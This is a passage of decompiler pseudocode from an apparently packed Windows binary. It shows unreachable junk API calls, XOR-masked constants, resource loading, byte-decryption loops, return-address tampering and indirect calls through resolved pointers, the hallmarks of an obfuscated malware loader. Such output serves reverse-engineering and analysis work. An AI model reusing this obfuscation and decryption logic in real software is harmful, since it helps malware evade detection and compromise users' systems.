// 40823E: using guessed type int dword_40823E;

//----- (0040411A) --------------------------------------------------------
unsigned int __usercall sub_40411A@<eax>(int a1@<ebp>, unsigned int a2@<edi>, LONG *a3@<esi>)
{
  unsigned int result; // eax
  LONG v4; // ecx

  *a3 = 1;
  result = InterlockedExchange(&Target, 7734887);
  while ( *a3 != a2 )
  {
    v4 = *a3;
    if ( *a3 >= a2 )
    {
      if ( v4 )
      {
        *a3 = v4 - 1;
        continue;
      }
    }
    else if ( v4 )
    {
      for ( tm.tmOverhang = 0; tm.tmOverhang < 0x1Bu; ++tm.tmOverhang )
      {
        if ( tm.tmOverhang == 38 )
          Polyline(*(HDC *)(a1 - 40), (const POINT *)&tm.tmOverhang, 26830);
      }
      result = a2 / 0x101 + v4 + 1;
      *a3 = result;
      continue;
    }
    *a3 = a2;
  }
  return result;
}
// 4041A2: variable 'v4' is possibly undefined

//----- (004041D5) --------------------------------------------------------
int sub_4041D5()
{
  int v0; // eax
  int v1; // eax
  unsigned int v3; // [esp+1Ch] [ebp-28h]
  unsigned int w; // [esp+2Ch] [ebp-18h]
  unsigned int v5; // [esp+38h] [ebp-Ch]

  v0 = (int)*off_407080;
  w = 0;
  do
  {
    if ( ++w == 33 )
      v0 = PatBlt((HDC)0xFFFFEFFC, 20194, 35887, 33, 34107, 0x2ADFu);
  }
  while ( w < 0x1D );
  v5 = (unsigned int)*off_407084;
  *off_408341[0] += (unsigned __int16)v3;
  dword_4072F0 = v0;
  tm.tmMaxCharWidth = (__PAIR64__(tm.tmMaxCharWidth, v5) - __PAIR64__(tm.tmDigitizedAspectY, v3)) >> 32;
  v1 = -4100;
  dword_4072F4 = 4 - dword_4072F0 + v5;
  if ( !dword_4072F0 )
    v1 = -4099;
  return (v1 ^ 0x352F) + 9518;
}
// 404278: variable 'v3' is possibly undefined
// 407080: using guessed type int (**off_407080)[459];
// 407084: using guessed type int **off_407084;
// 4072F0: using guessed type int dword_4072F0;
// 4072F4: using guessed type int dword_4072F4;
// 408341: using guessed type int *off_408341[2];

//----- (004042EB) --------------------------------------------------------
int sub_4042EB()
{
  int v0; // ecx
  int v1; // edx
  struct tagOFNW *v3; // [esp+1Ch] [ebp-24h]
  int v4; // [esp+38h] [ebp-8h] BYREF
  int v5; // [esp+3Ch] [ebp-4h]

  v5 = -4099;
  v0 = 13615;
  v1 = -9518;
  dword_40823A = 0;
  do
  {
    if ( ++dword_40823A == 28 )
      GetSaveFileNameW(v3);
  }
  while ( (unsigned int)dword_40823A < 0x16 );
  v4 = v1 + 9518;
  v5 = (int)off_4072D8;
  dword_40829E |= (unsigned int)&tm;
  return off_407580(
           off_407584,
           *off_4072D8[3],
           (char *)off_4072D8 + 318,
           4,
           dword_4072F0,
           dword_4072F4,
           (v0 ^ 0xFFFFEE3D) + 9518,
           &v4);
}
// 40434D: variable 'v3' is possibly undefined
// 404367: variable 'v1' is possibly undefined
// 4043B3: variable 'v0' is possibly undefined
// 4072D8: using guessed type int **off_4072D8;
// 4072F0: using guessed type int dword_4072F0;
// 4072F4: using guessed type int dword_4072F4;
// 407580: using guessed type int (__cdecl *off_407580)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 407584: using guessed type char *off_407584;
// 408222: using guessed type int dword_408222;
// 40823A: using guessed type int dword_40823A;
// 40829E: using guessed type int dword_40829E;
// 408371: using guessed type void *off_408371;

//----- (004043E8) --------------------------------------------------------
char **__stdcall sub_4043E8(
        int a1,
        int a2,
        void (__stdcall *a3)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD),
        int a4)
{
  char **result; // eax
  char *retaddr; // [esp+5Ch] [ebp+4h] BYREF

  if ( a4 == 550007 )
  {
    a3(off_407580, off_407584, dword_4070EC, dword_4070F0, dword_4070F4, a2, off_4072D8);
  }
  else if ( a4 == 203272 )
  {
    sub_4043E8(a1, a2, a3, 394281);
  }
  else
  {
    dword_4082C6 = 0;
    do
    {
      if ( ++dword_4082C6 == 29 )
        IsWindow((HWND)0x7AD3);
    }
    while ( (unsigned int)dword_4082C6 < 0x17 );
    tm.tmAveCharWidth *= 8;
    if ( *off_4072D8[3] && !dword_407090 )
      sub_404A5C();
    sub_4043E8(a1, a2, a3, 550007);
  }
  *off_4083B1[0] &= 0x71B1u;
  result = &retaddr;
  retaddr += dword_407100;
  return result;
}
// 404545: returning address of temporary local variable '%" r"'
// 407090: using guessed type int dword_407090;
// 4070EC: using guessed type int dword_4070EC;
// 4070F0: using guessed type int dword_4070F0;
// 4070F4: using guessed type int dword_4070F4;
// 407100: using guessed type int dword_407100;
// 4072D8: using guessed type int **off_4072D8;
// 407580: using guessed type int (__cdecl *off_407580)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 407584: using guessed type char *off_407584;
// 4082C6: using guessed type int dword_4082C6;
// 4083B1: using guessed type int *off_4083B1[17];

//----- (00404551) --------------------------------------------------------
int __stdcall sub_404551(int a1, int a2)
{
  int v2; // eax
  __int16 v3; // cx
  __int16 v4; // dx
  int Resource; // eax
  int *v6; // eax
  int result; // eax
  int v8; // edx
  int v9; // ecx
  _DWORD v10[26]; // [esp-8h] [ebp-224h] BYREF
  _DWORD v11[17]; // [esp+60h] [ebp-1BCh] BYREF
  int v12; // [esp+A4h] [ebp-178h]
  int v13; // [esp+ACh] [ebp-170h]
  unsigned int v14; // [esp+E8h] [ebp-134h]
  unsigned int *v15; // [esp+ECh] [ebp-130h]
  unsigned __int8 v16; // [esp+F4h] [ebp-128h]
  unsigned int v17; // [esp+F8h] [ebp-124h] BYREF
  int v18; // [esp+11Ch] [ebp-100h]
  int v19; // [esp+128h] [ebp-F4h]
  int v20; // [esp+130h] [ebp-ECh]
  unsigned int v21; // [esp+164h] [ebp-B8h]
  unsigned int v22; // [esp+168h] [ebp-B4h]
  int *v23; // [esp+170h] [ebp-ACh]
  int v24; // [esp+174h] [ebp-A8h]
  int v25[8]; // [esp+17Ch] [ebp-A0h] BYREF
  int v26; // [esp+1A0h] [ebp-7Ch]
  int v27; // [esp+1A8h] [ebp-74h]
  int v28; // [esp+1ACh] [ebp-70h]
  int v29; // [esp+1B4h] [ebp-68h]
  unsigned int v30; // [esp+1BCh] [ebp-60h]
  int v31; // [esp+1C0h] [ebp-5Ch]
  unsigned int i; // [esp+1C8h] [ebp-54h]
  __int16 v33[3]; // [esp+1CCh] [ebp-50h] BYREF
  int v34; // [esp+1D2h] [ebp-4Ah]
  __int16 v35; // [esp+1D6h] [ebp-46h]
  __int16 v36; // [esp+1D8h] [ebp-44h]
  __int16 v37; // [esp+1DAh] [ebp-42h]
  __int16 v38; // [esp+1DCh] [ebp-40h]
  __int16 v39; // [esp+1DEh] [ebp-3Eh]
  __int16 v40; // [esp+1E0h] [ebp-3Ch]
  __int16 v41; // [esp+1E2h] [ebp-3Ah]
  __int16 v42; // [esp+1E4h] [ebp-38h]
  __int16 v43; // [esp+1E6h] [ebp-36h]
  __int16 v44; // [esp+1E8h] [ebp-34h]
  int v45; // [esp+1EAh] [ebp-32h]
  __int16 v46[4]; // [esp+1F0h] [ebp-2Ch] BYREF
  HWND hWnd; // [esp+1F8h] [ebp-24h]
  __int16 v48; // [esp+1FCh] [ebp-20h]
  __int16 v49; // [esp+1FEh] [ebp-1Eh]
  __int16 v50; // [esp+200h] [ebp-1Ch]
  __int16 v51; // [esp+202h] [ebp-1Ah]
  __int16 v52; // [esp+204h] [ebp-18h]
  __int16 v53; // [esp+206h] [ebp-16h]
  __int16 v54; // [esp+208h] [ebp-14h]
  __int16 v55; // [esp+20Ah] [ebp-12h]
  HMODULE hModule; // [esp+20Ch] [ebp-10h]
  __int16 v57; // [esp+210h] [ebp-Ch]
  int v58; // [esp+214h] [ebp-8h]
  int v59; // [esp+218h] [ebp-4h]

  v2 = *(int *)((char *)&dword_40749C + a1);
  v25[7] = 40942;
  for ( i = 0; i < 0x1E; ++i )
    ;
  v59 = -4099;
  dword_40829E = (unsigned __int16)dword_40829E - v24;
  v58 = (v2 ^ 0x352F) + 9518;
  v15 = &v17;
  v17 = (__PAIR64__(v17, -4099) - __PAIR64__(v14, v30)) >> 32;
  word_407340[v58] = 0;
  v3 = -259;
  v4 = -751;
  v18 = (unsigned __int16)(dword_408262 & v18);
  v46[0] = -751;
  v46[1] = -259;
  v46[2] = -661;
  v46[3] = -262;
  *(_BYTE *)off_4083B9[0] |= 0x5Fu;
  v20 = 510813860;
  hWnd = (HWND)-17171174;
  v26 = (unsigned __int16)v26 - 1642;
  v48 = -740;
  v49 = -264;
  *(_DWORD *)&tm.tmCharSet |= v16;
  v50 = -663;
  v51 = -265;
  dword_40823A ^= v28;
  v52 = -762;
  Resource = 65270;
  v53 = -266;
  for ( dword_408276 = 0; (unsigned int)dword_408276 < 0x16; ++dword_408276 )
  {
    if ( dword_408276 == 36 )
      Resource = (int)FindResourceExW(hModule, &Type, &Name, (WORD)hModule);
  }
  v54 = v3;
  v55 = v3 - 8;
  hModule = (HMODULE)316150745;
  v18 = (unsigned __int16)v18 - 1;
  v22 = (__PAIR64__(v22, 13615) - __PAIR64__(v21, dword_4082A6)) >> 32;
  v57 = Resource;
  v33[0] = v4;
  v33[1] = v3;
  dword_4081D6 += (int)&tm.tmInternalLeading;
  v35 = v3 - 4;
  v36 = v4 + 7;
  tm.tmHeight &= (unsigned int)&dword_408226;
  v37 = v3 - 5;
  tm.tmDescent -= (LONG)&dword_40827A;
  tm.tmDescent |= (unsigned int)&tm.tmExternalLeading;
  v38 = v4 + 94;
  v39 = v3 - 6;
  v42 = v3;
  v40 = v4 - 11;
  v25[0] += dword_4082B6 + ((unsigned int)v10 > 0x352F);
  v43 = v3 - 8;
  v33[2] = v4 + 90;
  if ( Resource >= 23118 )
  {
    v23 = v25;
    v25[0] += (unsigned __int8)v22 + ((unsigned int)Resource < 0x5A4E);
  }
  else
  {
    v27 = (unsigned __int8)v27 ^ 0x19D3;
  }
  v31 -= (unsigned __int16)v29;
  v34 = -49152262;
  v41 = Resource;
  v19 = 16351;
  v44 = -31207;
  v45 = -17400040;
  v6 = off_4072D8[3];
  dword_40824E += (int)&dword_408216;
  dword_40824E &= (unsigned int)&dword_40825A;
  dword_40824E -= (int)&dword_4082A2;
  sub_40680C(off_407584, *v6, (int)v46, 3u);
  v13 = (unsigned __int8)v13 - v11[16];
  result = sub_40680C(off_407584, *off_4072D8[3], (int)v33, 1u);
  v12 = *(_DWORD *)off_408325 | (unsigned __int16)v12;
  v8 = *(int *)((char *)&dword_40749C + a1);
  v9 = *(int *)((char *)&dword_40749C + a2) ^ 0x352F;
  dword_40827E &= (unsigned int)&dword_408286;
  dword_40827E -= (int)&sz;
  if ( result != v9 + (v8 ^ 0x352F) + 19036 )
  {
    dword_408216 = 0;
    do
    {
      if ( ++dword_408216 == 34 )
        EnableScrollBar(hWnd, 0x78DAu, 0x4738u);
    }
    while ( (unsigned int)dword_408216 < 0x1A );
    *(_DWORD *)dword_4074D8 = (v59 ^ 0x352F) + 9518;
    v10[25] = v11;
    v11[0] |= 0x7B24u;
    result = (v59 ^ 0x352F) + 9518;
    *off_4072D8[3] = result;
  }
  return result;
}
// 4045F2: conditional instruction was optimized away because %var_54.4<1Eu
// 404799: variable 'v3' is possibly undefined
// 4047E9: variable 'v4' is possibly undefined
// 4072D8: using guessed type int **off_4072D8;
// 407340: using guessed type __int16 word_407340[130];
// 40749C: using guessed type int dword_40749C;
// 4074D8: using guessed type int dword_4074D8;
// 407584: using guessed type char *off_407584;
// 4081D6: using guessed type int dword_4081D6;
// 408216: using guessed type int dword_408216;
// 408226: using guessed type int dword_408226;
// 40823A: using guessed type int dword_40823A;
// 40824E: using guessed type int dword_40824E;
// 40825A: using guessed type int dword_40825A;
// 408262: using guessed type int dword_408262;
// 408276: using guessed type int dword_408276;
// 40827A: using guessed type int dword_40827A;
// 40827E: using guessed type int dword_40827E;
// 408286: using guessed type int dword_408286;
// 40829E: using guessed type int dword_40829E;
// 4082A2: using guessed type int dword_4082A2;
// 4082A6: using guessed type int dword_4082A6;
// 4082B6: using guessed type int dword_4082B6;
// 408325: using guessed type void *off_408325;
// 4083B9: using guessed type int *off_4083B9[15];

//----- (00404A5C) --------------------------------------------------------
int sub_404A5C()
{
  int v0; // eax
  unsigned int v1; // edx
  char v2; // bl
  unsigned __int16 v4; // [esp+34h] [ebp-C8h]
  int v5; // [esp+5Ch] [ebp-A0h]
  int v6; // [esp+64h] [ebp-98h]
  int v7; // [esp+68h] [ebp-94h]
  int v8; // [esp+70h] [ebp-8Ch]
  int v9; // [esp+8Ch] [ebp-70h]
  int v10; // [esp+98h] [ebp-64h]
  int v11; // [esp+B4h] [ebp-48h]
  unsigned __int16 v12; // [esp+C0h] [ebp-3Ch]
  int v13; // [esp+C8h] [ebp-34h]
  unsigned int v14; // [esp+D0h] [ebp-2Ch]
  int v15; // [esp+D4h] [ebp-28h]
  int v16; // [esp+ECh] [ebp-10h]
  char v17; // [esp+FBh] [ebp-1h]

  dword_4081D6 = 0;
  do
  {
    if ( ++dword_4081D6 == 29 )
      CharToOemW(pSrc, &pDst);
  }
  while ( (unsigned int)dword_4081D6 < 0x13 );
  if ( sub_4041D5() )
  {
    sub_4042EB();
    dword_408266 = (__PAIR64__(dword_408266, 13615) - __PAIR64__(v12, 9518)) >> 32;
    dword_408222 = v7 | (unsigned __int8)dword_408222;
    v0 = dword_4072F0;
    dword_40823A &= v5;
    dword_40825E ^= v9;
    v16 = -9518;
    v1 = 0;
    v15 = dword_4072F4;
    if ( dword_4072F4 )
    {
      do
      {
        for ( dword_4082B2 = 0; (unsigned int)dword_4082B2 < 0x1D; ++dword_4082B2 )
        {
          if ( dword_4082B2 == 30 )
            v0 = SetWindowTextW((HWND)0x5592, &String);
        }
        if ( v8 <= 34652 )
          v10 = __ROR4__(v10, 8);
        else
          v11 += (unsigned __int8)sz;
        v6 += *off_408341[0];
        v13 ^= 0x1479u;
        v17 = __ROR1__(*(_BYTE *)(v1 + v0) - 46, 1);
        v2 = *(_BYTE *)(v1 + v0);
        dword_408226 += (int)&dword_408286 + (v1 < dword_4082C6);
        dword_408226 |= (unsigned int)&tm.tmAveCharWidth;
        dword_408226 += (int)&dword_408272;
        *(_BYTE *)(v1 + v0) ^= v2;
        v14 = 0;
        do
        {
          if ( ++v14 == 35 )
            v0 = CharLowerBuffW(&sz, 0x275Au);
        }
        while ( v14 < 0x1E );
        *(_DWORD *)off_40832D -= v4;
        ++*(_BYTE *)(v1 + v0);
        *(_BYTE *)(v1 + v0) += v17;
        *(_BYTE *)off_408385[0] |= 0x50u;
        --*(_BYTE *)(v1 + v0);
        dword_408296 &= *off_4083D5[0];
        v16 = v16 - 9517 + 9518;
        v1 = v16 + 9518;
      }
      while ( v16 + 9518 != v15 );
    }
  }
  return 0;
}
// 404B2A: variable 'v12' is possibly undefined
// 404B56: variable 'v7' is possibly undefined
// 404B78: variable 'v5' is possibly undefined
// 404B98: variable 'v9' is possibly undefined
// 404C0E: variable 'v8' is possibly undefined
// 404C1B: variable 'v11' is possibly undefined
// 404C28: variable 'v10' is possibly undefined
// 404C37: variable 'v6' is possibly undefined
// 404CC9: variable 'v13' is possibly undefined
// 404C43: variable 'v1' is possibly undefined
// 404D6C: variable 'v4' is possibly undefined
// 4072F0: using guessed type int dword_4072F0;
// 4072F4: using guessed type int dword_4072F4;
// 4081D6: using guessed type int dword_4081D6;
// 408222: using guessed type int dword_408222;
// 408226: using guessed type int dword_408226;
// 40823A: using guessed type int dword_40823A;
// 40823E: using guessed type int dword_40823E;
// 40825E: using guessed type int dword_40825E;
// 408266: using guessed type int dword_408266;
// 408272: using guessed type int dword_408272;
// 408286: using guessed type int dword_408286;
// 408296: using guessed type int dword_408296;
// 4082B2: using guessed type int dword_4082B2;
// 4082C6: using guessed type int dword_4082C6;
// 40832D: using guessed type void *off_40832D;
// 408341: using guessed type int *off_408341[2];
// 408385: using guessed type int *off_408385[10];
// 4083D5: using guessed type int *off_4083D5[8];

//----- (00404DF2) --------------------------------------------------------
int sub_404DF2()
{
  unsigned int i; // edx
  int v1; // edi
  int v2; // ecx
  int v3; // ecx
  int v4; // ecx
  int v6; // [esp+0h] [ebp-6Ch]
  __int16 v7; // [esp+8h] [ebp-64h]
  int v8; // [esp+30h] [ebp-3Ch]
  int y; // [esp+44h] [ebp-28h]
  int cy; // [esp+50h] [ebp-1Ch]
  unsigned int v11; // [esp+54h] [ebp-18h]
  UINT uFlags; // [esp+60h] [ebp-Ch]
  int v13; // [esp+68h] [ebp-4h]

  for ( i = 5; i < 0x14; ++i )
  {
    if ( dword_407090 )
      break;
    v11 = 0;
    do
    {
      if ( ++v11 == 44 )
        DeferWindowPos((HDWP)0x82DF, (HWND)0x119A, (HWND)0x324F, y, y, 33503, cy, uFlags);
    }
    while ( v11 < 0x1D );
    v7 -= dword_40824A;
    byte_4074D7[i] = (byte_4074D7[i] ^ 0x5F) + 49;
  }
  v8 = 143151392;
  v1 = 0;
  if ( !*off_4072D8[3] )
    v1 = sub_403AC6();
  v2 = -4099;
  do
  {
    v3 = v2 ^ 0x352F;
    v13 = 2 * v3 + 19036;
    dword_4081CA -= v6;
    v8 += 17661;
    v2 = (v3 + 1) ^ 0x352F;
    *(__int16 *)((char *)&word_4074C4 + v13) = (*(__int16 *)((char *)&word_4074BC + v13) ^ 0x32F) + 558;
  }
  while ( v2 != -4102 );
  if ( v1 )
  {
    v4 = 9;
    do
    {
      byte_407640[v4 - 9] = (byte_407520[v4 - 9] ^ 0x5F) + 49;
      --v4;
    }
    while ( v4 );
    *off_4072D8[3] = v1;
  }
  return v13;
}
// 404E13: variable 'v11' is possibly undefined
// 404E43: variable 'y' is possibly undefined
// 404E43: variable 'cy' is possibly undefined
// 404E43: variable 'uFlags' is possibly undefined
// 404E5C: variable 'v7' is possibly undefined
// 404E60: variable 'i' is possibly undefined
// 404F02: variable 'v6' is possibly undefined
// 407090: using guessed type int dword_407090;
// 4072D8: using guessed type int **off_4072D8;
// 4074BC: using guessed type __int16 word_4074BC;
// 4074C4: using guessed type __int16 word_4074C4;
// 407520: using guessed type _BYTE byte_407520[4];
// 407640: using guessed type _BYTE byte_407640[336];
// 4081CA: using guessed type int dword_4081CA;
// 40822A: using guessed type int dword_40822A;
// 40824A: using guessed type int dword_40824A;
// 40824E: using guessed type int dword_40824E;

//----- (00404F90) --------------------------------------------------------
int sub_404F90()
{
  int result; // eax
  int i; // edi
  int j; // [esp+24h] [ebp-14h]
  int v3[2]; // [esp+30h] [ebp-8h] BYREF
  void *retaddr; // [esp+3Ch] [ebp+4h] BYREF

  v3[1] = 183096;
  v3[0] = (int)*off_407058;
  dword_4074B8 = 0;
  result = sub_4053E4();
  if ( result )
  {
    for ( i = -4360; i != -4100; i = ((i ^ 0x352F) - 1) ^ 0x352F )
    {
      dword_407318 = dword_4074CC;
      dword_40731C = dword_4074D0;
      dword_407320 = unk_4074D4;
      if ( i == -4101 )
      {
        for ( j = 31; j; --j )
        {
          if ( j == 37 )
            BeginPaint((HWND)0x4E5A, (LPPAINTSTRUCT)&tm.tmAscent);
        }
        *(_DWORD *)dword_4074B8 += dword_407100;
      }
      else if ( i == -4547 )
      {
        dword_407314 = (int)v3;
        *(_DWORD *)dword_4074D8 = sub_405105();
      }
      dword_4074B8 = (int)&retaddr;
      result = -9517;
    }
  }
  return result;
}
// 407058: using guessed type void ***off_407058;
// 407100: using guessed type int dword_407100;
// 407314: using guessed type int dword_407314;
// 407318: using guessed type int dword_407318;
// 40731C: using guessed type int dword_40731C;
// 407320: using guessed type int dword_407320;
// 4074B8: using guessed type int dword_4074B8;
// 4074CC: using guessed type int dword_4074CC;
// 4074D0: using guessed type int dword_4074D0;
// 4074D8: using guessed type int dword_4074D8;
// 40824E: using guessed type int dword_40824E;

//----- (00405105) --------------------------------------------------------
int sub_405105()
{
  int v1; // [esp+70h] [ebp-4h] BYREF
  char *retaddr; // [esp+78h] [ebp+4h] BYREF

  dword_4070EC = *(&dword_407314 + 1);
  *(_DWORD *)&tm.tmFirstChar = 0;
  do
  {
    if ( ++*(_DWORD *)&tm.tmFirstChar == 30 )
      GetTempPathA(0x5159u, Buffer);
  }
  while ( *(_DWORD *)&tm.tmFirstChar < 0x1Cu );
  dword_4070F0 = *(&dword_407314 + 2);
  dword_4070F4 = *(&dword_407314 + 3);
  sub_403EC3((int)&v1, *(_DWORD *)dword_407314, (int)off_4072FC);
  if ( sub_40528E() )
  {
    v1 = 0;
    dword_407098 += 6780263;
  }
  else
  {
    v1 = *off_4072D8[15];
  }
  dword_4072F8 = (int)&retaddr;
  retaddr += dword_407100;
  return v1;
}
// 407098: using guessed type int dword_407098;
// 4070EC: using guessed type int dword_4070EC;
// 4070F0: using guessed type int dword_4070F0;
// 4070F4: using guessed type int dword_4070F4;
// 407100: using guessed type int dword_407100;
// 4072D8: using guessed type int **off_4072D8;
// 4072F8: using guessed type int dword_4072F8;
// 4072FC: using guessed type double (*off_4072FC)();
// 407314: using guessed type int dword_407314;
// 4081CE: using guessed type int dword_4081CE;
// 4082B6: using guessed type int dword_4082B6;

//----- (0040528E) --------------------------------------------------------
int sub_40528E()
{
  int v0; // ebx
  int v1; // eax
  unsigned int v3; // [esp+20h] [ebp-64h]
  unsigned int v4; // [esp+28h] [ebp-5Ch]
  int v5; // [esp+60h] [ebp-24h]
  int i; // [esp+68h] [ebp-1Ch]
  void (__stdcall *v7)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // [esp+70h] [ebp-14h]
  _DWORD *v8; // [esp+78h] [ebp-Ch]
  char *retaddr; // [esp+88h] [ebp+4h] BYREF

  v8 = (_DWORD *)dword_407304;
  for ( i = 17; i; --i )
  {
    if ( i == 27 )
      CreateDiscardableBitmap((HDC)0x8AB1, v5, 30192);
  }
  v0 = dword_407308;
  v7 = (void (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))dword_40730C;
  dword_40824A -= (int)&dword_4081D6;
  dword_40824A |= (unsigned int)&dword_408266;
  dword_40824A += (int)&dword_408296;
  if ( sub_403C7F((int)off_4072D8, v8) )
  {
    v1 = -4100;
  }
  else
  {
    sub_4043E8((int)off_4072D8, v0, v7, 203272);
    dword_40826E = (__PAIR64__((unsigned __int16)dword_40826E, 9518) - __PAIR64__(v4, v3)) >> 32;
    dword_407300 = (int)&retaddr;
    retaddr += dword_407100;
    v1 = -4099;
  }
  tm.tmOverhang -= dword_4082B6;
  return (v1 ^ 0x352F) + 9518;
}
// 4052E5: variable 'v5' is possibly undefined
// 4053AF: variable 'v3' is possibly undefined
// 4053AF: variable 'v4' is possibly undefined
// 407100: using guessed type int dword_407100;
// 4072D8: using guessed type int **off_4072D8;
// 407300: using guessed type int dword_407300;
// 407304: using guessed type int dword_407304;
// 407308: using guessed type int dword_407308;
// 40730C: using guessed type int dword_40730C;
// 4081D6: using guessed type int dword_4081D6;
// 40824A: using guessed type int dword_40824A;
// 408266: using guessed type int dword_408266;
// 40826E: using guessed type int dword_40826E;
// 408296: using guessed type int dword_408296;
// 4082B6: using guessed type int dword_4082B6;
// 408389: using guessed type int *off_408389[9];

//----- (004053E4) --------------------------------------------------------
int sub_4053E4()
{
  int v0; // eax
  unsigned int DateFormatW; // eax
  int *v2; // ecx
  int i; // ecx
  int v4; // ebx
  int v5; // eax
  int v6; // eax
  bool v7; // cf
  int (__cdecl *v8)(_DWORD, void *); // eax
  unsigned int v9; // eax
  unsigned int v11; // [esp-4h] [ebp-A0h]
  int v12; // [esp+30h] [ebp-6Ch]
  int v13; // [esp+34h] [ebp-68h]
  int v14; // [esp+3Ch] [ebp-60h]
  int v15; // [esp+4Ch] [ebp-50h]
  int v16; // [esp+50h] [ebp-4Ch]
  int v17; // [esp+5Ch] [ebp-40h]
  int v18; // [esp+60h] [ebp-3Ch]
  unsigned __int8 v19; // [esp+64h] [ebp-38h]
  int v20; // [esp+64h] [ebp-38h]
  int v21; // [esp+68h] [ebp-34h]
  unsigned int v22; // [esp+6Ch] [ebp-30h]
  RECT *lprect; // [esp+7Ch] [ebp-20h]
  int v24; // [esp+80h] [ebp-1Ch] BYREF
  int *v25; // [esp+84h] [ebp-18h]
  int v26; // [esp+88h] [ebp-14h]
  int j; // [esp+8Ch] [ebp-10h]
  int (__cdecl *v28)(_DWORD, void *); // [esp+90h] [ebp-Ch]
  unsigned int v29; // [esp+94h] [ebp-8h]
  unsigned int v30; // [esp+98h] [ebp-4h]

  v26 = -4103;
  v24 = 183096;
  v25 = &v24;
  v0 = sub_404DF2();
  for ( dword_40825A = 0; (unsigned int)dword_40825A < 0x1D; ++dword_40825A )
  {
    if ( dword_40825A == 38 )
      v0 = RectInRegion((HRGN)0x6DC5, lprect);
  }
  v29 = v0;
  v21 = 466755372;
  v30 = -4099;
  v20 = *(_DWORD *)off_408319 | v19;
  do
  {
    v13 ^= LOBYTE(tm.tmMaxCharWidth);
    DateFormatW = dword_407090;
    if ( dword_407090 )
      break;
    v2 = off_4072D8[3];
    if ( *v2 )
      dword_4074EC = sub_40680C(off_407584, *v2, (int)(off_4072D8 + 20), 1u);
    if ( dword_4074EC )
    {
      v28 = 0;
      for ( i = -4099; ; i = (v4 + 1) ^ 0x352F )
      {
        v9 = *v25;
        dword_40829A = v16 ^ (unsigned __int16)dword_40829A;
        if ( v9 % 0x61 > 0x8A || i == -4147 )
          break;
        dword_4082A6 -= dword_4081D2;
        v4 = i ^ 0x352F;
        v29 = 8 * (((i ^ 0x352Fu) + 9518) % ((v26 ^ 0x352Fu) + 9518));
        v5 = stricmp(String1, String2);
        v15 ^= 0x7275u;
        dword_40824A += (int)&dword_408222 + (dword_4082A2 < v11);
        if ( v5 )
        {
          sub_40680C(off_407584, dword_4074EC, (int)&unk_4074F0, 3u);
          v21 = 226066332;
        }
        v6 = -4595;
        for ( j = -9438; j != -9518; --j )
        {
          if ( v6 == -4568 )
          {
            for ( dword_40823E = 0; (unsigned int)dword_40823E < 0x1A; ++dword_40823E )
            {
              if ( dword_40823E == 32 )
                IntersectRect((LPRECT)&tm.tmWeight, (const RECT *)0x5B7B, lprect);
            }
            dword_407514 = v28(*off_4072D8[3], &unk_407638);
          }
          else if ( v6 == -4547 )
          {
            if ( __SETP__(v22, 19372) )
            {
              v7 = __CFADD__(v22 < 0x4BAC, v18) | __CFADD__(v17, (v22 < 0x4BAC) + v18);
              v18 += v17 + (v22 < 0x4BAC);
            }
            else
            {
              v7 = __CFADD__(*(_DWORD *)&DateStr, v12);
              v12 += *(_DWORD *)&DateStr;
            }
            v14 += v13 + v7;
            v8 = (int (__cdecl *)(_DWORD, void *))sub_40680C(off_407584, *(_DWORD *)off_40711C, (int)&unk_4071A4, 2u);
            *(_BYTE *)off_4082F5[39] |= 0x8Eu;
            v28 = v8;
          }
          *off_408301 += v17;
          v6 = (j - 1) ^ 0x352F;
        }
        v16 = 2147483582;
        dword_40826A = (unsigned __int16)(LOWORD(tm.tmHeight) & dword_40826A);
        j = 8 * (((v30 ^ 0x352F) + 9518) % ((v26 ^ 0x352Fu) + 9518));
        sub_404551(v29, j);
        *off_408391[0] ^= 0xBEu;
      }
    }
    v21 -= v20;
    DateFormatW = ((v30 ^ 0x352F) + 1) ^ 0x352F;
    v30 = DateFormatW;
  }
  while ( DateFormatW != -4595 );
  for ( *(_DWORD *)&DateStr = 23; *(_DWORD *)&DateStr; --*(_DWORD *)&DateStr )
  {
    if ( *(_DWORD *)&DateStr == 39 )
      DateFormatW = GetDateFormatW(0x24C8u, 0x887Au, (const SYSTEMTIME *)0x12F9, (LPCWSTR)0x7EE8, &DateStr, (int)lprect);
  }
  *off_408365[0] += v14 + (dword_408242 < DateFormatW);
  return 1;
}
// 405447: variable 'lprect' is possibly undefined
// 405488: variable 'v19' is possibly undefined
// 4054AA: variable 'v13' is possibly undefined
// 405558: variable 'v15' is possibly undefined
// 40555E: variable 'v11' is possibly undefined
// 405646: variable 'v22' is possibly undefined
// 405658: variable 'v18' is possibly undefined
// 405658: variable 'v17' is possibly undefined
// 405665: variable 'v12' is possibly undefined
// 405673: variable 'v14' is possibly undefined
// 40573D: variable 'v16' is possibly undefined
// 407090: using guessed type int dword_407090;
// 40711C: using guessed type void *off_40711C;
// 4072D8: using guessed type int **off_4072D8;
// 4074EC: using guessed type int dword_4074EC;
// 407514: using guessed type int dword_407514;
// 407584: using guessed type char *off_407584;
// 4081D2: using guessed type int dword_4081D2;
// 408222: using guessed type int dword_408222;
// 40823E: using guessed type int dword_40823E;
// 408242: using guessed type int dword_408242;
// 40824A: using guessed type int dword_40824A;
// 40825A: using guessed type int dword_40825A;
// 40826A: using guessed type int dword_40826A;
// 40829A: using guessed type int dword_40829A;
// 4082A2: using guessed type int dword_4082A2;
// 4082A6: using guessed type int dword_4082A6;
// 4082F5: using guessed type int *off_4082F5[4];
// 408301: using guessed type int *off_408301;
// 408319: using guessed type void *off_408319;
// 408365: using guessed type int *off_408365[3];
// 408391: using guessed type int *off_408391[7];

//----- (004057E6) --------------------------------------------------------
int __userpurge sub_4057E6@<eax>(__int16 a1@<ax>, unsigned __int16 a2)
{
  bool v2; // zf
  int v3; // eax
  UINT Msg; // [esp+0h] [ebp-28h]
  WPARAM wParam; // [esp+10h] [ebp-18h]
  LPARAM lParam; // [esp+18h] [ebp-10h]

  v2 = a1 == (__int16)a2;
  v3 = -4099;
  if ( v2 )
  {
    for ( dword_408222 = 22; dword_408222; --dword_408222 )
    {
      if ( dword_408222 == 30 )
        PostMessageW((HWND)0x52A4, Msg, wParam, lParam);
    }
    v3 = -4100;
  }
  return (v3 ^ 0x352F) + 9518;
}
